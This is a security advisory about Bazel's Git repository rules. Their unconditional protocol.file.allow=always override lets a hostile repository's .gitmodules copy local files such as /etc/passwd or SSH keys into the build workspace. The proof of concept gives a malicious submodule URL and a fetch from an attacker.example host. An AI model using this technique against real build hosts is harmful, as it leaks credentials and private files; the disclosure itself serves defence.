### Title
Bazel's Git repository rules force `protocol.file.allow=always` for submodules, reintroducing Git's file-protocol submodule arbitrary local file exfiltration (CVE-2022-39253 class) - ([File: tools/build_defs/repo/git_worker.bzl])

### Summary
`git_repository`/`new_git_repository` fetch untrusted repository content with `git`, and when `init_submodules`/`recursive_init_submodules` is enabled, Bazel unconditionally sets `protocol.file.allow=always` before running `git submodule update`. This strips the protection Git itself added (default `protocol.file.allow=user`, which blocks a repository's own `.gitmodules` from silently cloning `file://` submodules) specifically to stop a hostile repository from causing the client to read/copy arbitrary files from the local filesystem into the checkout.

### Finding Description
`update_submodules` in [1](#0-0)  runs:
```
_git_maybe_shallow(ctx, git_repo, "-c", "protocol.file.allow=always", "submodule", "update", "--init", ...)
```
The comment explains this override was added "to allow the submodule command clone from a local directory" for a Git 2.38.1 compatibility issue (bazelbuild/bazel#17040), citing a real regression Bazel intentionally worked around by disabling a Git security control.

Git's own default of `protocol.file.allow=user` (as opposed to `always`) exists precisely because `.gitmodules` content is attacker-controlled data coming from the fetched repository itself — a malicious remote can declare a submodule with a `file:///...` URL pointing at any path readable by the user (e.g. `/etc/passwd`, `~/.ssh/id_rsa`, `~/.aws/credentials`, or other files on the build host). When `file` protocol is force-allowed, `git submodule update --init` will locally "clone" that path, using hardlinks/copies of arbitrary file content into the resulting workspace tree, where it can then be read by consuming build targets, embedded in build outputs, or exfiltrated by subsequent build steps.

The attacker in this scenario is exactly the "unprivileged, content-only" actor allowed by scope: they only need to control the Git repository/branch content that `remote` in `git_repository(...)` points to (e.g. a public/shared upstream repo, a fork used via a mirror, or any repository content a CI job builds from an untrusted branch/PR). They need no access to the victim's machine, credentials, or the trusted root-repo `BUILD`/`MODULE.bazel` files — only `init_submodules = True` (a common, legitimate configuration already present in the root repo) needs to be set for the rule.

### Impact Explanation
Successful exploitation allows reading files outside of the intended git checkout / repository directory on the build host, satisfying the "read outside the repository / exec root / output base" impact class. Depending on which paths are readable by the build user, this can leak credentials, SSH keys, cloud tokens, or other sensitive local files into the fetched repository's working tree, from where they can be incorporated into build artifacts or otherwise exfiltrated.

### Likelihood Explanation
The `-c protocol.file.allow=always` override is unconditional whenever submodules are initialized — it is not guarded by any check that the submodule URLs are trusted, and there is no allowlist of protocols/hosts for submodule content. Any `git_repository`/`new_git_repository` usage with `init_submodules`/`recursive_init_submodules` set to `True` against a repository the attacker can push content to (open-source dependency compromise, malicious fork used as a mirror, or an untrusted PR branch built by CI) is affected by default, with no non-default flag required.

### Recommendation
Do not force `protocol.file.allow=always` globally. Instead, only allow `file` transport for submodules that are already local trusted paths (e.g., matching the fetched repo's own directory tree) or restrict allowed protocols to the ones present in the top-level `remote` (e.g., `https`/`ssh`), consistent with Git's `protocol.allow`/`protocol.file.allow` design intent, and document/opt-in the workaround for issue #17040 rather than applying it unconditionally to all submodule fetches.

### Proof of Concept
1. Host a Git repository `evil.git` with a `.gitmodules` file:
```
[submodule "leak"]
    path = leak
    url = file:///etc/passwd
```
(or a more damaging local path such as a directory containing SSH keys).
2. In the victim's Bazel workspace:
```python
git_repository(
    name = "evil",
    remote = "https://attacker.example/evil.git",
    branch = "main",
    init_submodules = True,
)
```
3. Running `bazel build` triggers `git_repo()` → `update_submodules()` → `git -c protocol.file.allow=always submodule update --init --checkout --force`, which clones `file:///etc/passwd` (or the attacker-chosen local path) into `@evil//leak`, making its contents readable to subsequent build steps/targets that depend on `@evil//leak`, despite the attacker having only ever supplied repository content, not machine or credential access.

### Citations

**File:** tools/build_defs/repo/git_worker.bzl (L210-217)
```text
def update_submodules(ctx, git_repo, recursive = False):
    if recursive:
        # "protocol.file.allow=always" allows the submodule command clone from a local directory.
        # It's necessary for Git 2.38.1 and assoicated backport versions.
        # See https://github.com/bazelbuild/bazel/issues/17040
        _git_maybe_shallow(ctx, git_repo, "-c", "protocol.file.allow=always", "submodule", "update", "--init", "--recursive", "--checkout", "--force")
    else:
        _git_maybe_shallow(ctx, git_repo, "-c", "protocol.file.allow=always", "submodule", "update", "--init", "--checkout", "--force")
```
